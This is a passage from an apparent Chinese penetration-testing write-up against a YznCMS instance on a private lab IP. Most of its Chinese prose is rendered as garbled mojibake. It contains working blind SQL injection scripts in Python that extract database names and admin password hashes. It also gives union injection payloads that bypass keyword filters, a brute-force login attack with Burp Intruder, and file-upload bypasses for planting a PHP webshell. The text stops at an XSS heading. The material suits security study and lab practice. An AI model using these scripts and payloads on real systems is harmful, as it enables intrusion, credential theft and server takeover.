src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322194849731.png" alt="image-20210322194849731"></p><p>è¿”å›çš„æ˜¯<code>wrong password</code>ï¼Œè¯´æ˜æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç æ˜¯å¤§äº100çš„ï¼Œç›´æ¥ä½¿ç”¨äºŒåˆ†æ³¨å…¥ï¼Œè„šæœ¬å¦‚ä¸‹</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> timeurl = <span class="hljs-string">&quot;http://192.168.164.147:81/change/changepass&quot;</span>heard = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;http://192.168.164.147:81/change/changepass&quot;</span>&#125;flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    left = <span class="hljs-number">32</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(left &lt; right):        <span class="hljs-comment"># time.sleep(1)</span>        payload = <span class="hljs-string">&quot;szy&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125; #&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload = <span class="hljs-string">&quot;szy&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload = <span class="hljs-string">&quot;szy&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a&gt;&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload = <span class="hljs-string">&quot;szy&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a&gt;&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        data = &#123;<span class="hljs-string">&quot;account&quot;</span>:payload, <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;111a&quot;</span>,<span class="hljs-string">&quot;npassword&quot;</span>:<span class="hljs-string">&quot;222&quot;</span>,<span class="hljs-string">&quot;newpassword&quot;</span>:<span class="hljs-string">&quot;222&quot;</span>&#125;        response = requests.post(url=url,data=data,headers=heard)        <span class="hljs-comment"># t = response.text</span>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;wrong password&quot;</span> <span class="hljs-keyword">in</span> response.text:            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    flag = flag + <span class="hljs-built_in">chr</span>(mid)    print(flag)print(flag)â€‹```database:yzncmstable:yzn_admincolumns:<span class="hljs-built_in">id</span>,username,password,roleid,encryptâ€‹```</code></pre><p>yzn_adminçš„åˆ—åï¼Œçœç•¥äº†åé¢çš„åˆ—</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322200732911.png" alt="image-20210322200732911"></p><p>è·å–ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç </p><pre><code class="hljs apache"><span class="hljs-attribute">username</span>:admin<span class="hljs-attribute">password</span>:<span class="hljs-number">9724</span>b<span class="hljs-number">5</span>e<span class="hljs-number">6</span>c<span class="hljs-number">56</span>b<span class="hljs-number">95</span>f<span class="hljs-number">5723009</span>ef<span class="hljs-number">81961</span>bfe</code></pre><p>è¿™ä¸ªå¯†ç æ˜¯32ä½çš„ï¼Œå¯èƒ½æ˜¯md5å¤„ç†åä¿å­˜çš„ï¼Œæš‚æ—¶æ— æ³•ç ´è§£ã€‚</p><h3 id="æ¼æ´ç‚¹äºŒ"><a href="#æ¼æ´ç‚¹äºŒ" class="headerlink" title="æ¼æ´ç‚¹äºŒ"></a>æ¼æ´ç‚¹äºŒ</h3><p>ç”¨æˆ·ç™»å½•åï¼Œå­˜åœ¨ä¸€ä¸ªæŸ¥æ‰¾ç”¨æˆ·é‚®ç®±çš„åŠŸèƒ½ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨æ³¨å…¥ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181146985.png" alt="image-20210421181146985" style="zoom:67%;"><p>è¿™é‡Œå·²ç»æç¤ºäº†å­˜åœ¨äº†è¿‡æ»¤ï¼Œé‚£ä¹ˆå°±çœ‹çœ‹è¿‡æ»¤é‚£äº›ä¸œè¥¿</p><p>è¾“å…¥ä¸€ä¸ªå­˜åœ¨çš„ç”¨æˆ·åï¼ŒæŸ¥æ‰¾ç»“æœå¦‚å›¾</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181314404.png" alt="image-20210421181314404" style="zoom:50%;"><p>è¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ·</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181345626.png" alt="image-20210421181345626" style="zoom:33%;"><p>å°è¯•è¾“å…¥</p><pre><code class="hljs apache"><span class="hljs-attribute">sunzy</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #</code></pre><p>ç½‘é¡µæŠ¥é”™ï¼Œå¹¶å°†é”™è¯¯ä¿¡æ¯æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹åˆ°è¾“å…¥çš„or,ç©ºæ ¼éƒ½è¢«æ¢æˆäº†ç©ºæ ¼ï¼Œè¿™è¿˜æ˜¯å¾ˆå®¹æ˜“ç»•è¿‡çš„</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181603698.png" alt="image-20210421181603698" style="zoom:50%;"><p>fuzzæµ‹è¯•åï¼Œå‘ç°è¿‡æ»¤<code>union,ç©ºæ ¼,or,and,select,from</code>ï¼Œå¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œç©ºæ ¼çš„å¯ä»¥ä½¿ç”¨<code>/**/</code>æ›¿æ¢</p><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°è¿”å›ç»“æœåªæœ‰ä¸€åˆ—</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421182546039.png" alt="image-20210421182546039" style="zoom: 50%;"><p>ç›´æ¥è¿›è¡Œsqlæ³¨å…¥</p><ul><li><p>è·å–æ•°æ®åº“ä¸­çš„è¡¨å</p><pre><code class="hljs gauss">sunda&#x27;<span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-built_in">group_concat</span>(table_name)<span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>infoorrmation_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-built_in">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span></code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421183121965.png" alt="image-20210421183121965" style="zoom:50%;"></li><li><p>è·å–å­—æ®µå</p><pre><code class="hljs reasonml">sunda&#x27;<span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>group<span class="hljs-constructor">_concat(<span class="hljs-params">column_name</span>)</span><span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>infoorrmation_schema.columns<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&quot;yzn_member&quot;</span>#</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421183924790.png" alt="image-20210421183924790" style="zoom:50%;"></li><li><p>è·å–å­—æ®µå€¼</p><pre><code class="hljs reasonml">sunda&#x27;<span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>group<span class="hljs-constructor">_concat(<span class="hljs-params">passwoorrd</span>)</span><span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>yzn_member#</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421184126966.png" alt="image-20210421184126966" style="zoom:67%;"></li></ul><h3 id="æ¼æ´ç‚¹ä¸‰"><a href="#æ¼æ´ç‚¹ä¸‰" class="headerlink" title="æ¼æ´ç‚¹ä¸‰"></a>æ¼æ´ç‚¹ä¸‰</h3><p>ç”¨æˆ·ä¸»é¡µ-&gt;ç§¯åˆ†èµ é€ï¼Œé€šè¿‡æµ‹è¯•å¯ä»¥å‘ç°ä¹Ÿæ˜¯å­˜åœ¨sqlæ³¨å…¥çš„</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423172440793.png" alt="image-20210423172440793" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423173007408.png" alt="image-20210423173007408" style="zoom:50%;"><p>å› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦ä½¿ç”¨ç›²æ³¨</p><p>ç›²æ³¨è„šæœ¬ä¸ä¸Šé¢çš„ç±»ä¼¼ï¼Œç¨åŠ ä¿®æ”¹å³å¯ã€‚</p><h3 id="æ¼æ´ç‚¹å››"><a href="#æ¼æ´ç‚¹å››" class="headerlink" title="æ¼æ´ç‚¹å››"></a>æ¼æ´ç‚¹å››</h3><p>æ³¨å†Œåç™»å½•ï¼Œå‘ç°å…¶ä¸­å­˜åœ¨ä¸€ä¸ªæŠ•ç¨¿çš„åŠŸèƒ½ï¼ŒæŠ•ç¨¿åéœ€è¦ç®¡ç†å‘˜å®¡æ ¸ï¼Œåœ¨æ­¤æœŸé—´æˆ‘ä»¬å¯ä»¥å†æ¬¡ç¼–è¾‘æˆ‘ä»¬çš„ç¨¿ä»¶</p><p>å½“ç‚¹å‡»ç¼–è¾‘åï¼Œå‘ç°urlä¸Šå¤šäº†ä¸€ä¸ªidå‚æ•°ï¼Œè¿™åº”è¯¥æ˜¯æˆ‘ä»¬ç¨¿ä»¶çš„idï¼Œæ–¹ä¾¿æŸ¥è¯¢ã€‚ä½†æ˜¯é€šå¸¸è¿™ç§å‚æ•°å¦‚æœè¿‡æ»¤ä¸ä¸¥æ ¼çš„è¯ä¹Ÿä¼šå­˜åœ¨SQLæ³¨å…¥ï¼Œè€Œè¿™ä¸ªä½ç½®æ˜¾ç„¶è¾“å…¥æ•°å­—å‹æ³¨å…¥ã€‚</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">164.147</span>:<span class="hljs-number">81</span><span class="hljs-regexp">/member/</span>content/edit.html?id=<span class="hljs-number">3</span></code></pre><p>æ¢æµ‹æ˜¯å¦ å­˜åœ¨æ³¨å…¥ï¼Œå½“è¾“å…¥<code>?id=3 and 1=1 #</code>æ—¶é¡µé¢è¿”å›æ­£å¸¸ï¼Œä½†æ˜¯å½“è¾“å…¥<code>?id=3 and 1=2#</code>,å´æç¤ºäº†ç¨¿ä»¶ä¸å­˜åœ¨ï¼Œè¯´æ˜è¿™é‡Œä¹Ÿæ˜¯å­˜åœ¨æ³¨å…¥çš„ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œæ— æ³•è·å–è¿”å›çš„å†…å®¹åªèƒ½é‡‡ç”¨ç›²æ³¨çš„æ–¹æ³•ã€‚</p><p>==åœ¨æµ‹è¯•çš„è¿‡ç¨‹ç§å‘ç°è¿™ä¸ªä½ç½®ä½¿ç”¨ <code>&gt;</code>æ—¶ä¼šå‡ºç°é”™è¯¯æç¤ºï¼Œè€Œ<code>&lt;</code>ä¸èµ·ä½œç”¨ï¼Œåªèƒ½ä½¿ç”¨<code>=</code>ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨äºŒåˆ†æ³¨å…¥ï¼Œä½†æ˜¯ç›´æ¥æš´åŠ›ç ´è§£ä¹Ÿå¾ˆå¿«==</p><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2021/3/20 9:03</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : cms_sql2.py</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> timeurl = <span class="hljs-string">&quot;http://192.168.164.147:81/member/content/edit.html?id=&quot;</span>header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;thinkphp_show_page_trace=0|0; PHPSESSID=d2b4f4b001d70e670953a36d00ca8be6; thinkphp_show_page_trace=0|0&quot;</span>&#125;flag = <span class="hljs-string">&quot;&quot;</span>words = [<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;f&quot;</span>,<span class="hljs-string">&quot;g&quot;</span>,<span class="hljs-string">&quot;h&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;j&quot;</span>,<span class="hljs-string">&quot;k&quot;</span>,<span class="hljs-string">&quot;l&quot;</span>,<span class="hljs-string">&quot;m&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>,<span class="hljs-string">&quot;o&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;t&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-string">&quot;v&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>,<span class="hljs-string">&quot;C&quot;</span>,<span class="hljs-string">&quot;D&quot;</span>,<span class="hljs-string">&quot;E&quot;</span>,<span class="hljs-string">&quot;F&quot;</span>,<span class="hljs-string">&quot;G&quot;</span>,<span class="hljs-string">&quot;H&quot;</span>,<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-string">&quot;J&quot;</span>,<span class="hljs-string">&quot;K&quot;</span>,<span class="hljs-string">&quot;L&quot;</span>,<span class="hljs-string">&quot;M&quot;</span>,<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-string">&quot;O&quot;</span>,<span class="hljs-string">&quot;P&quot;</span>,<span class="hljs-string">&quot;Q&quot;</span>,<span class="hljs-string">&quot;R&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>,<span class="hljs-string">&quot;T&quot;</span>,<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-string">&quot;V&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>,<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;Y&quot;</span>,<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;5&quot;</span>,<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;9&quot;</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>():</span>    flag = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):        <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:            <span class="hljs-comment"># payload = &quot;3 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a = &#123;1&#125;)#&quot;.format(i,ord(word))</span>            payload = <span class="hljs-string">&quot;3 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a=&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(word))            payload = <span class="hljs-string">&quot;3 and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a=&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(word))            url1 = url+payload            res = requests.get(url1,headers=header)            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ç«‹å³æäº¤&quot;</span> <span class="hljs-keyword">in</span> res.text:                flag += word                <span class="hljs-keyword">break</span>        print(flag)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    dump()</code></pre><p>æˆåŠŸè·å–åˆ°æ•°æ®åº“åï¼Œæ¼æ´åˆ©ç”¨æˆåŠŸã€‚</p><h2 id="6-æš´åŠ›ç ´è§£"><a href="#6-æš´åŠ›ç ´è§£" class="headerlink" title="6.æš´åŠ›ç ´è§£"></a>6.æš´åŠ›ç ´è§£</h2><p>è¯¥æ¼æ´æ˜¯ç”±äºç®¡ç†å‘˜æˆ–è€…ç”¨æˆ·ä½¿ç”¨äº†å¸¸ç”¨çš„ç®€å•å¯†ç ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æš´åŠ›ç ´è§£çš„æ–¹å¼è·å–ç”¨æˆ·åå’Œå¯†ç ï¼Œå‰é¢çš„sqlæ³¨å…¥æˆ‘ä»¬å¯ä»¥çŸ¥é“ç®¡ç†å‘˜è´¦å·ä¸ºadmin,ä½†æ˜¯å¯†ç ä¸ºåŠ ç›åçš„md5å€¼ï¼Œæˆ‘ä»¬æ— æ³•ç ´è§£ï¼Œåªèƒ½å°è¯•ä½¿ç”¨æš´åŠ›ç ´è§£ã€‚</p><p>åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ç‚¹ä¸€ä¸­æˆ‘ä»¬å‘ç°äº†adminæ¨¡å—å°±åœ¨è·¯å¾„ä¸º<code>\application\admin</code>ï¼Œæ‰€ä»¥ç®¡ç†å‘˜åå°urlåº”è¯¥ä¸º<code>http://192.168.164.147/admin</code></p><p>å½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥æ ¹æ®ç»éªŒçŒœæµ‹åå°ç™»å½•è·¯å¾„ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323144704682.png" alt="image-20210323144704682"></p><p>è®¿é—®åå°</p><p>æŸ¥çœ‹æºç å¯ä»¥å‘ç°ï¼Œç™»å½•æ˜¯éœ€è¦tokençš„ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ä½¿ç”¨bpè‡ªå¸¦çš„æ¨¡å—ç ´è§£ï¼Œä¸è¿‡éœ€è¦éº»çƒ¦ä¸€ç‚¹ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406191847633.png" alt="image-20210406191847633"></p><ul><li><p>ä½¿ç”¨bpæŠ“åŒ…ï¼Œå°†æ•°æ®åŒ…å‘é€åˆ°<code>Intruder</code>æ¨¡å—ï¼Œç„¶ååŠ ä¸Šå‚æ•°ï¼Œé€‰æ‹©<code>Pitchfork</code>æ¨¡å¼</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192132707.png" alt="image-20210406192132707" style="zoom:67%;"></li><li><p>åˆ°optioné¡µé¢ï¼Œä¸å¯ä»¥å¤šçº¿ç¨‹</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192222031.png" alt="image-20210406192222031" style="zoom:67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192611191.png" alt="image-20210406192611191" style="zoom:67%;"><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192635613.png" alt="image-20210406192635613"></p></li><li><p>è®¾ç½®payload1,ä¹Ÿå°±æ˜¯tokenå€¼</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192820026.png" alt="image-20210406192820026"></p></li><li><p>è®¾ç½®payload2 passwordçš„å€¼ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©è‡ªå·±æ”¶è—çš„å¯†ç å­—å…¸ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨bpè‡ªå¸¦çš„ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406193125862.png" alt="image-20210406193125862" style="zoom:67%;"></li></ul><p>çˆ†ç ´ç»“æœ</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406193217954.png" alt="image-20210406193217954" style="zoom: 67%;"><p>å½“å¯†ç ä¸ºadminæ—¶ï¼Œå¯ä»¥çœ‹åˆ°ç›¸åº”åŒ…ä¸­è¿”å›çš„æ•°æ®å­˜åœ¨ä¸€ä¸ªurlï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œæ˜¯ï¼Œç™»å½•æˆåŠŸåè¿›è¡Œçš„è·³è½¬ï¼Œå¯ä»¥åœ¨æµè§ˆå™¨ä¸­çœ‹åˆ°ï¼Œå·²ç»ç™»å½•åˆ°äº†åå°é¡µé¢</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406193418062.png" alt="image-20210406193418062" style="zoom:67%;"><p>ç»“åˆå‰é¢sqlæ³¨å…¥è·å–çš„å¯†ç å’Œencryptï¼Œå°è¯•çŒœæµ‹å¯†ç çš„ä¿å­˜æ–¹å¼</p><pre><code class="hljs apache"><span class="hljs-attribute">md5</span>(&#x27;adminWo<span class="hljs-number">0</span>bAa&#x27;) = <span class="hljs-number">9724</span>b<span class="hljs-number">5</span>e<span class="hljs-number">6</span>c<span class="hljs-number">56</span>b<span class="hljs-number">95</span>f<span class="hljs-number">5723009</span>ef<span class="hljs-number">81961</span>bfe</code></pre><p>æ‰€ä»¥å¯†ç ä¿å­˜çš„æ˜¯å¯†ç å’ŒåŠ å¯†å› å­æ‹¼æ¥åçš„md5å€¼ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323150840468.png" alt="image-20210323150840468" style="zoom:67%;"><h2 id="7-æ–‡ä»¶ä¸Šä¼ ï¼ˆ3ä¸ªï¼‰"><a href="#7-æ–‡ä»¶ä¸Šä¼ ï¼ˆ3ä¸ªï¼‰" class="headerlink" title="7.æ–‡ä»¶ä¸Šä¼ ï¼ˆ3ä¸ªï¼‰"></a>7.æ–‡ä»¶ä¸Šä¼ ï¼ˆ3ä¸ªï¼‰</h2><h3 id="æ¼æ´ç‚¹ä¸€-1"><a href="#æ¼æ´ç‚¹ä¸€-1" class="headerlink" title="æ¼æ´ç‚¹ä¸€"></a>æ¼æ´ç‚¹ä¸€</h3><p>ç”¨æˆ·ç™»å½•åå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå›¾ç‰‡å¾é›†é¡µé¢<code>http://192.168.164.147/member/index/photo</code></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220533116.png" alt="image-20210420220533116"></p><p>éšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶åï¼Œå¯ä»¥çœ‹åˆ°è¿”å›äº†å›¾ç‰‡çš„ä¿å­˜åœ°å€</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220615042.png" alt="image-20210420220615042"></p><p>ä½†æ˜¯å½“ä¸Šä¼ ä¸€ä¸ªéå›¾ç‰‡ç±»å‹æ—¶ï¼Œä¼šæç¤ºåªå…è®¸ä¸Šä¼ <code>.jpg|.png|.gif</code></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220733976.png" alt="image-20210420220733976"></p><p>è¿™åªæ˜¯å‰ç«¯æ£€æµ‹ï¼ŒæŠ“åŒ…å°±å¯ä»¥è§£å†³</p><p>æŠ“åŒ…ä¸Šä¼ ä¸€ä¸ªphpä¸ºåç¼€çš„æ–‡ä»¶ï¼Œå¹¶å°†MIMEæ”¹ä¸º<code>image/jpeg</code>,å¯ä»¥çœ‹åˆ°phpåç¼€è¢«æ¢æˆç©ºäº†</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220956393.png" alt="image-20210420220956393"></p><p>å°è¯•åŒå†™ç»•è¿‡ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶å·²ç»æ­£å¸¸ä¸Šä¼ </p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420221049529.png" alt="image-20210420221049529"></p><p>è®¿é—®å¯ä»¥çœ‹åˆ°phpinfo<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420221137498.png" alt="image-20210420221137498" style="zoom:50%;"></p><p>ä¸‹é¢å°±æ˜¯ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œæ§åˆ¶æœåŠ¡å™¨</p><h3 id="æ¼æ´ç‚¹äºŒ-1"><a href="#æ¼æ´ç‚¹äºŒ-1" class="headerlink" title="æ¼æ´ç‚¹äºŒ"></a>æ¼æ´ç‚¹äºŒ</h3><p>ç”¨æˆ·ç™»å½•åå¯ä»¥åœ¨å†…å®¹ç®¡ç†â€”&gt;åœ¨çº¿æŠ•ç¨¿çš„ä½ç½®æŠ•ç¨¿ï¼Œè¿™é‡Œç”¨æˆ·å¯ä»¥ä¸Šä¼ ç¨¿ä»¶ä¸­éœ€è¦ç”¨åˆ°å›¾ç‰‡</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406154414604.png" alt="image-20210406154414604" style="zoom: 50%;"><p>ä½†æ˜¯æ”»å‡»è€…å¯èƒ½ä¼šä¸Šä¼ ä¸€äº›åˆ»æ„æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€å¥è¯æœ¨é©¬ï¼Œæ¥æ”»å‡»æœåŠ¡å™¨ï¼Œä¸‹é¢æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶è·å–<code>phpinfo</code></p><p>é¦–å…ˆé€‰æ‹©ä¸€å¼ ç©ºçš„ç…§ç‰‡ï¼Œç„¶åå°†å…¶æ”¹ä¸ºphpæ–‡ä»¶ï¼Œå†…å®¹ä¸º<code>&lt;? phpinfo(); ?&gt;</code>ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šä¼ æˆåŠŸçš„url</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406160155045.png" alt="image-20210406160155045"></p><p>è®¿é—®æœåŠ¡å™¨è¿”å›çš„urlï¼Œå·²ç»çœ‹åˆ°è¯¥ç½‘ç«™çš„phpinfoä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯ç¡®å®šäº†è¯¥ä¸Šä¼ ç›®å½•æ‹¥æœ‰å¯æ‰§è¡Œæƒé™ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬è¿›ä¸€æ­¥æ§åˆ¶è¯¥æœåŠ¡å™¨ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406160256835.png" alt="image-20210406160256835"></p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406160534542.png" alt="image-20210406160534542"></p><p>ä½¿ç”¨èšå‰‘è¿æ¥å³å¯ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322205328527.png" alt="image-20210322205328527"></p><h3 id="æ¼æ´ç‚¹ä¸‰-1"><a href="#æ¼æ´ç‚¹ä¸‰-1" class="headerlink" title="æ¼æ´ç‚¹ä¸‰"></a>æ¼æ´ç‚¹ä¸‰</h3><p>åœ¨ä¸Šä¸€æ­¥ä¸­æˆ‘ä»¬å·²ç»çŸ¥é“äº†adminçš„è´¦å·å¯†ç ï¼Œç„¶åç™»å½•ã€‚å†ç”¨è‡ªå·±æ³¨å†Œçš„è´¦å·å‘æŸä¸ªæ ç›®æŠ•ç¨¿ï¼Œä¹‹åç®¡ç†å‘˜å†å®¡æ ¸ï¼Œä¾¿ä¼šå‡ºç°ä¸€ä¸ªç±»ä¼¼äºç”¨æˆ·æŠ•ç¨¿çš„é¡µé¢ï¼Œç„¶åå°±å¯ä»¥åƒä¸Šä¸€ä¸ªæ¼æ´ä¸€æ ·ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406161255195.png" alt="image-20210406161255195"></p><h2 id="8-XSSï¼ˆ2ä¸ªï¼‰"><a href="#8-XSSï¼ˆ2ä¸ªï¼‰" class="headerlink" 